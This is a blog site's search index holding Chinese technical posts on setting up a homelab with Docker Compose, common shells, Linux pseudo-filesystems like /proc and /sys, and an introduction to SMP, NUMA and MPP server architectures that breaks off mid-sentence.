<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>搭建自己的HomeLab</title>
    <link href="/2024/06/22/%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84HomeLab/"/>
    <url>/2024/06/22/%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84HomeLab/</url>
    
    <content type="html"><![CDATA[<p>如何搭建一个属于自己的“实验室”？</p><span id="more"></span><p>Homelab 是指可在家中搭建的实验（折腾）环境，用于进行实验和学习。通常指一系列硬件设备（家用服务器、小主机、旧电脑手机、树莓派等），上面运行着操作系统环境和软件（Linux、虚拟机、Docker 等）。Homelab 有很多种用途，比如作为软路由、远程主机，也可以部署一系列的自托管服务，如个人书库、影视库、密码管理器、个人网站、RSS 阅读器、播客服务器、备忘录等等。不仅实用，也可以作一门兴趣，为生活增添乐趣。</p><h2 id="我的-Homelab-配置"><a href="#我的-Homelab-配置" class="headerlink" title="我的 Homelab 配置"></a>我的 Homelab 配置</h2><p>我自己的 Homelab 配置是 <strong>轻量云服务器</strong> + <strong>小主机</strong> + <strong>NAS</strong>，它们的配置与用途各有千秋：</p><p><img src="https://media.wiki-power.com/img/202304130031463.png"></p><p>不难看出，它们都是偏科生，但只要合作起来便是三边形战士。<strong>轻量云服务器</strong> 偏向网络访问型，<strong>小主机</strong> 偏向性能处理型，<strong>NAS</strong> 偏向空间存储型。</p><h3 id="轻量云服务器"><a href="#轻量云服务器" class="headerlink" title="轻量云服务器"></a>轻量云服务器</h3><p><strong>轻量云服务器</strong> 其实就是云服务器厂商多余的边角料，配置不高，但胜在价格实惠，比如我购买的阿里云轻量仅 ￥ 96 &#x2F; 年（如果你有更便宜的套餐不妨让我了解一下）。</p><p>因为有公网 IP （80&#x2F;443 端口也是开放的），我在这台轻量云主机上部署的服务，主要是 frp 服务器、反向代理服务器、访问其他机器的跳板机、监控其它主机的面板、小型网站服务、网站 uptime 监测等需要通过公网直接访问的服务。</p><h3 id="小主机"><a href="#小主机" class="headerlink" title="小主机"></a>小主机</h3><p><strong>小主机</strong> 我选用了零刻 N100 CPU 的准系统，自配 16G DDR5 内存条与 250G SSD 硬盘，总体下来大概 ￥ 1000 出头。日常功耗不高，在需要性能的时候也能呼之即来。</p><p><img src="https://media.wiki-power.com/img/202304130043744.png"></p><p>在小主机上部署的应用类型，主要是 web VS Code 代码编辑器、私有笔记库、RSS 阅读器、播客服务器、影视库、内网浏览器等这一类需要消耗性能的服务。</p><h3 id="NAS"><a href="#NAS" class="headerlink" title="NAS"></a>NAS</h3><p><strong>NAS</strong> 我选用的是群晖 DS220+，X86 架构方便运行 Docker 环境。前一段时间，我还给它加上了一条 16G 的内存条，企图提升它的性能。但随后发现，瓶颈仍然是那颗孱弱的 J4025 CPU。白群晖算是买软件送硬件了，但是为了资料的安全性，还算是值得的。</p><p><img src="https://media.wiki-power.com/img/202304130053483.png"></p><p>我在 NAS 上部署的，主要是设备资料备份、网盘同步、照片库、书库等储存需求型的服务。</p><h2 id="如何一键批量部署-Docker-compose"><a href="#如何一键批量部署-Docker-compose" class="headerlink" title="如何一键批量部署 Docker compose"></a>如何一键批量部署 Docker compose</h2><p>有了折腾不止的精神，三天两头刷系统是不可避免的。部署了那么多的应用，总不可能一个个单独 bring up 吧。这儿有个简单的 shell 脚本，可以一键部署所有 Docker compose：</p><p>compose.sh</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>echo<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>&quot;starting compose.sh...&quot;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span># 遍历当前目录下的一级文件夹<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>for<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>folder<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>in<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>*/<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>do<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>[<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>&quot;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>$folder<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>&quot;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>!<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>=<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>&quot;Archive/&quot;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>]<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span># 忽略 Archive 文件夹<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>cd<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>&quot;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>$folder<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>&quot;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span># 进入文件夹<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>docker-compose<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>up<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>-d<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span># 执行 docker compose up -d 命令<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>cd<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>..<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span># 返回上级目录<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>done<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>echo<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>&quot;done.&quot;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><br></code></pre></td></tr></table></figure><p>我的目录结构是这样的：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><span class="hljs-variable">&lt;span&gt;</span><span class="hljs-variable">&lt;/span&gt;</span><span class="hljs-variable">&lt;code&gt;</span>├── compose<br>│   ├── code-server<br>|<span class="hljs-string">   </span>|<span class="hljs-string">   ├──compose.yaml</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   ├──.env</span><br><span class="hljs-string">│   ├── frp</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   ├──compose.yaml</span><br><span class="hljs-string">│   ├── xxx</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   ├──compose.yaml</span><br><span class="hljs-string">│   ├── ……</span><br><span class="hljs-string">│   └── compose.sh</span><br><span class="hljs-string">&lt;/code&gt;</span><br></code></pre></td></tr></table></figure><p>只要在 compose 目录下执行 <code>sh compose.sh</code>，就能一键启动所有的 Docker compose 了。</p><h2 id="自托管的优势"><a href="#自托管的优势" class="headerlink" title="自托管的优势"></a>自托管的优势</h2><p>相比于第三方托管，让别人替你保管数据，<strong>自托管（Self-Hosted）</strong> 具有十足的优势，表现在你对个人数据拥有完全的掌控权，可以根据自己的喜好去定制所需，能帮你获取到更多优质的信息源（个人书库、影视库、RSS 服务）。前提是要有一定的时间精力与资金投入，并且拥有一颗乐于折腾的心。</p><p>在接下来的一系列文章中，我将介绍一些基础的配置，还有许多有趣的服务。上面提到的铁三角组合，只是我个人的差异化配置，如果你只有一台机器，折腾起来也是完全没有问题的。我将介绍的内容大多是基于 Docker 与 Docker-compose 部署的，因为这种方式兼容性极佳，在不同配置的机器上都能做到开箱即用。但需要提及的一点是，机器的选择最好是 X86 架构的，因为有些许容器没有做 ARM 适配，需要自己编译安装。</p><h2 id="参考与致谢"><a href="#参考与致谢" class="headerlink" title="参考与致谢"></a>参考与致谢</h2><ul><li><a href="https://www.v2ex.com/t/901954">你们的 NAS 部署了什么有趣的服务？</a></li><li><a href="https://juejin.cn/post/7082842557482270734">一键启动多个 docker-compose 配置容器</a></li></ul><blockquote><p>原文地址：<a href="https://wiki-power.com/">https://wiki-power.com/</a><br>本篇文章受 <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC BY-NC-SA 4.0</a> 协议保护，转载请注明出处。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见的shell项目</title>
    <link href="/2024/06/22/%E5%B8%B8%E8%A7%81%E7%9A%84shell%E9%A1%B9%E7%9B%AE/"/>
    <url>/2024/06/22/%E5%B8%B8%E8%A7%81%E7%9A%84shell%E9%A1%B9%E7%9B%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="常见的shell项目"><a href="#常见的shell项目" class="headerlink" title="常见的shell项目"></a>常见的shell项目</h1><ul><li>bash</li><li>zsh</li><li>fish</li><li><a href="https://www.nushell.sh/zh-CN/book/parallelism.html">Nushell</a></li><li>csh</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux中的伪文件系统</title>
    <link href="/2024/06/21/Linux%E4%B8%AD%E7%9A%84%E4%BC%AA%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
    <url>/2024/06/21/Linux%E4%B8%AD%E7%9A%84%E4%BC%AA%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux中的伪文件系统"><a href="#Linux中的伪文件系统" class="headerlink" title="Linux中的伪文件系统"></a>Linux中的伪文件系统</h1><p>什么是伪文件系统？</p><p>伪文件系统是一种特殊的文件系统，它是一种虚拟文件系统，它并不真实存在于硬盘上，而是在内存中。它主要用于实现一些特殊功能，<strong>或者说是一些不用于保存文件数据的文件系统</strong>。如：</p><ul><li>&#x2F;proc文件系统：它是一个伪文件系统，它是Linux系统中一个特殊的目录，它包含了系统的运行信息，如系统的环境变量、进程信息、内存使用情况等。</li><li>&#x2F;sys文件系统：它也是一种伪文件系统，它包含了系统的硬件信息，如CPU、内存、磁盘等设备的状态信息。</li></ul><p>这些伪文件系统的存在，使得Linux系统可以实现一些特殊的功能，如：</p><ul><li>实现系统监控：通过&#x2F;proc文件系统可以获取系统的运行信息，如CPU使用率、内存使用情况、磁盘使用情况等。</li><li>实现设备控制：通过&#x2F;sys文件系统可以控制系统的硬件设备，如开启或关闭设备、设置设备参数等。</li></ul><p><strong>实际上，可以将这些伪文件系统看作是一种接口，可以通过它们来获取系统的相关信息，同时它们并不真实存在于硬盘上，也不占用磁盘空间。所以这些文件系统下的文件的大小一般是 0</strong></p><p>通过命令 <code>sudo cat /proc/filesystems | grep nodev</code> 可以知道本系统所支持的<strong>伪文件系统</strong>，这里应用的实际上是 <code>nodev</code> 表示的是伪文件系统。</p><p>常见的伪文件系统如下：</p><table><thead><tr><th>伪文件系统</th><th>常用挂载点</th><th>描述</th></tr></thead><tbody><tr><td>procfs</td><td><code>/proc</code></td><td>查看和操作进程相关的信息和配置</td></tr><tr><td>sysfs</td><td><code>/sys</code></td><td>查看和操作系统相关的信息和配置</td></tr><tr><td>configfs</td><td><code>/sys/kernel/config</code></td><td>创建、管理和删除内核对象</td></tr><tr><td>debugfs</td><td></td><td>用于内核状态调试</td></tr><tr><td>cgroupfs</td><td></td><td>用于管理系统的中 cgroup</td></tr><tr><td>hugetlbfs</td><td></td><td>查看和管理系统中的大页信息</td></tr></tbody></table><p>用户和应用程序可以通过 <code>proc</code> 得到系统的信息（大多数虚拟文件可以使用文件查看命令如cat、more或者less进行查看，有些文件信息表述的内容可以一目了然，但也有文件的信息却不怎么具有可读性。不过，这些可读性较差的文件在使用一些命令如apm、free、lspci或top查看时却可以有着不错的表现），并可以改变内核的某些参数。由于系统的信息，如进程是动态改变的，所以用户或应用程序读取proc文件时，proc文件系统是动态从系统内核读出所需信息并提交的。下面列出的这些文件或子文件夹，并不是都是在你的系统中存在，这取决于你的内核配置和装载的模块。另外，在&#x2F;proc下还有三个很重要的目录：net、scsi和sys。 sys目录是可写的，可以通过它来访问或修改内核的参数，而 net和scsi 则依赖于内核配置。例如：如果系统不支持scsi，则scsi 目录不存在。<br>c</p><h2 id="proc伪文件系统"><a href="#proc伪文件系统" class="headerlink" title="&#x2F;proc伪文件系统"></a>&#x2F;proc伪文件系统</h2><p>这个伪文件系统被挂载在 <code>/proc</code> 目录下，它包含了系统的运行信息，如系统的环境变量、进程信息、内存使用情况等。</p><p>&#x2F;proc下大部分文件是只读的，很多系统工具通过&#x2F;proc获取信息，比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsmod等同于<span class="hljs-built_in">cat</span> /proc/modules<br>lspci等同于<span class="hljs-built_in">cat</span> /proc/pci<br></code></pre></td></tr></table></figure><p>部分文件可写，对于这些文件的修改，等同于使用 <code>sysctl</code> 命令重设内核参数。</p><p>下面对于 <code>/proc/</code> 目录下的文件进行一些说明：</p><p><strong>下面这些文件主要是对于系统中的硬件信息、运行资源的监控</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs bash">- /proc/buddyinfo 每个内存区中的每个order有多少块可用，和内存碎片问题有关<br><br>- /proc/cmdline 启动时传递给kernel的参数信息<br><br>- /proc/cpuinfo cpu的信息<br><br>- /proc/crypto 内核使用的所有已安装的加密密码及细节<br><br>- /proc/devices 已经加载的设备并分类<br><br>- /proc/dma 已注册使用的ISA DMA频道列表<br><br>- /proc/execdomains Linux内核当前支持的execution domains<br><br>- /proc/fb 帧缓冲设备列表，包括数量和控制它的驱动<br><br>- /proc/filesystems 内核当前支持的文件系统类型<br><br>- /proc/interrupts x86架构中的每个IRQ中断数<br><br>- /proc/iomem 每个物理设备当前在系统内存中的映射<br><br>- /proc/ioports 一个设备的输入输出所使用的注册端口范围<br><br>- /proc/kcore 代表系统的物理内存，存储为核心文件格式，里边显示的是字节数，等于RAM大小加上4kb<br><br>- /proc/kmsg 记录内核生成的信息，可以通过/sbin/klogd或/bin/dmesg来处理<br><br>- /proc/loadavg 根据过去一段时间内CPU和IO的状态得出的负载状态，与<span class="hljs-built_in">uptime</span>命令有关<br><br>- /proc/locks 内核锁住的文件列表<br><br>- /proc/mdstat 多硬盘，RAID配置信息(md=multiple disks)<br><br>- /proc/meminfo RAM使用的相关信息<br><br>- /proc/misc 其他的主要设备(设备号为10)上注册的驱动<br><br>- /proc/modules 所有加载到内核的模块列表<br><br>- /proc/mounts 系统中使用的所有挂载<br><br>- /proc/mtrr 系统使用的Memory Type Range Registers (MTRRs)<br><br>- /proc/partitions 分区中的块分配信息<br><br>- /proc/pci 系统中的PCI设备列表<br><br>- /proc/slabinfo 系统中所有活动的 slab 缓存信息<br><br>- /proc/stat 所有的CPU活动信息<br><br>- /proc/sysrq-trigger 使用<span class="hljs-built_in">echo</span>命令来写这个文件的时候，远程root用户可以执行大多数的系统请求关键命令，就好像在本地终端执行一样。要写入这个文件，需要把/proc/sys/kernel/sysrq不能设置为0。这个文件对root也是不可读的<br><br>- /proc/uptime 系统已经运行了多久<br><br>- /proc/swaps 交换空间的使用情况<br><br>- /proc/version Linux内核版本和gcc版本<br><br>- /proc/bus 系统总线(Bus)信息，例如pci/usb等<br><br>- /proc/driver 驱动信息<br><br>- /proc/fs 文件系统信息<br><br>- /proc/ide ide设备信息<br><br>- /proc/irq 中断请求设备信息<br><br>- /proc/net 网卡设备信息<br><br>- /proc/scsi scsi设备信息<br><br>- /proc/tty <span class="hljs-built_in">tty</span>设备信息<br><br>- /proc/net/dev 显示网络适配器及统计信息<br><br>- /proc/vmstat 虚拟内存统计信息<br><br>- /proc/vmcore 内核panic时的内存映像<br><br>- /proc/diskstats 取得磁盘信息<br><br>- /proc/schedstat kernel调度器的统计信息<br><br>- /proc/zoneinfo 显示内存空间的统计信息，对分析虚拟内存行为很有用c<br></code></pre></td></tr></table></figure><p><strong>下面这些文件主要关于每一个进程的运行状态</strong>；其中 <code>X</code> 表示进程号。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">/proc/X pid为X的进程信息<br><br>/proc/X/cmdline 进程启动命令，启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息<br><br>/proc/X/cwd 链接到进程当前工作目录，指向当前进程运行目录的一个符号链接<br><br>/proc/X/environ 进程环境变量列表，当前进程的环境变量列表，彼此间用空字符（NULL）隔开；变量用大写字母表示，其值用小写字母表示<br><br>/proc/X/exe 链接到进程的执行命令文件，指向启动当前进程的可执行文件（完整路径）的符号链接，通过/proc/N/exe可以启动当前进程的一个拷贝<br><br>/proc/X/fd 包含进程相关的所有的文件描述符，这是个目录，包含当前进程打开的每一个文件的文件描述符（file descriptor），这些文件描述符是指向实际文件的一个符号链接<br><br>/proc/X/maps 与进程相关的内存映射信息，当前进程关联到的每个可执行文件和库文件在内存中的映射区域及其访问权限所组成的列表<br><br>/proc/X/mem 指代进程持有的内存，不可读，当前进程所占用的内存空间，由open、<span class="hljs-built_in">read</span>和lseek等系统调用使用，不能被用户读取<br><br>/proc/X/root 链接到进程的根目录，指向当前进程运行根目录的符号链接；在Unix和Linux系统上，通常采用<span class="hljs-built_in">chroot</span>命令使每个进程运行于独立的根目录<br><br>/proc/X/stat 进程的状态，当前进程的状态信息，包含一系统格式化后的数据列，可读性差，通常由ps命令使用<br><br>/proc/X/statm 进程使用的内存的状态<br><br>/proc/X/status 进程状态信息，比<span class="hljs-built_in">stat</span>/statm更具可读性<br><br>/proc/self 链接到当前正在运行的进程<br><br><br></code></pre></td></tr></table></figure><h2 id="伪文件系统——参考资料"><a href="#伪文件系统——参考资料" class="headerlink" title="伪文件系统——参考资料"></a>伪文件系统——参考资料</h2><ul><li><a href="http://m.w3capi.com/mcms/content/id/62/cid/27.html">Linux中的 proc 目录有什么用</a></li><li><a href="https://caosiyang.github.io/posts/2021/08/01/linux-filesystem-proc/">Linux系统目录之&#x2F;proc</a></li></ul><h2 id="sys伪文件系统"><a href="#sys伪文件系统" class="headerlink" title="&#x2F;sys伪文件系统"></a>&#x2F;sys伪文件系统</h2><p>Linux 2.6以后的内核引入了sysfs文件系统，sysfs被看成是与proc、devfs和devpty同类别的文件系统，该文件系统是一个虚拟的文件系统，它可以产生一个包括所有系统硬件的层级视图，与提供进程和状态信息的proc文件系统十分类似。sysfs把连接在系统上的设备和总线组织成为一个分级的文件，它们可以由用户空间存取，向用户空间导出内核数据结构以及它们的属性。sysfs的一个目的就是展示设备驱动模型中各组件的层次关系，其顶级目录包括block、bus、dev、devices、class、fs、kernel、power和firmware等。</p><p>block目录包含所有的块设备；devices目录包含系统所有的设备，并根据设备挂接的总线类型组织成层次结构；bus目录包含系统中所有的总线类型；class目录包含系统中的设备类型（如网卡设备、声卡设备、输入设备等）。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SMP、NUMA、MPP体系结构介绍</title>
    <link href="/2024/06/21/SMP%E3%80%81NUMA%E3%80%81MPP%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E4%BB%8B%E7%BB%8D/"/>
    <url>/2024/06/21/SMP%E3%80%81NUMA%E3%80%81MPP%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E4%BB%8B%E7%BB%8D/</url>
    
    <content type="html"><![CDATA[<p>转载SMP、NUMA、MPP体系结构介绍</p><span id="more"></span><p>从系统架构来看，目前的商用服务器大体可以分为三类，即对称多处理器结构 (SMP ： Symmetric Multi-Processor) ，非一致存储访问结构 (NUMA ： Non-Uniform Memory Access) ，以及海量并行处理结构 (MPP ： Massive Parallel Processing) 。它们的特征分别描述如下：</p><h1 id="1-SMP-Symmetric-Multi-Processor"><a href="#1-SMP-Symmetric-Multi-Processor" class="headerlink" title="1. SMP(Symmetric Multi-Processor)"></a><strong>1. SMP(Symmetric Multi-Processor)</strong></h1><p>SMP (Symmetric Multi Processing),对称多处理系统内有许多紧耦合多处理器，在这样的系统中，所有的CPU共享全部资源，如总线，内存和I&#x2F;O系统等，操作系统或管理数据库的复本只有一个，这种系统有一个最大的特点就是共享所有资源。多个CPU之间没有区别，平等地访问内存、外设、一个操作系统。操作系统管理着一个队列，每个处理器依次处理队列中的进程。如果两个处理器同时请求访问一个资源（例如同一段内存地址），由硬件、软件的锁机制去解决资源争用问题。Access to RAM is serialized; this and <a href="http://en.wikipedia.org/wiki/Cache_coherency">cache coherency</a> issues causes performance to lag slightly behind the number of additional processors in the system.<a href="http://en.wikipedia.org/wiki/File:Shared_memory.svg"></a></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202406212143289.png"></p><p>所谓对称多处理器结构，是指服务器中多个 CPU 对称工作，无主次或从属关系。各 CPU 共享相同的物理内存，每个 CPU 访问内存中的任何地址所需时间是相同的，因此 SMP 也被称为一致存储器访问结构 (UMA ： Uniform Memory Access) 。对 SMP 服务器进行扩展的方式包括增加内存、使用更快的 CPU 、增加 CPU 、扩充 I&#x2F;O( 槽口数与总线数 ) 以及添加更多的外部设备 ( 通常是磁盘存储 ) 。</p><p>SMP 服务器的主要特征是共享，系统中所有资源 (CPU 、内存、 I&#x2F;O 等 ) 都是共享的。也正是由于这种特征，导致了 SMP 服务器的主要问题，那就是它的扩展能力非常有限。对于 SMP 服务器而言，每一个共享的环节都可能造成 SMP 服务器扩展时的瓶颈，而最受限制的则是内存。由于每个 CPU 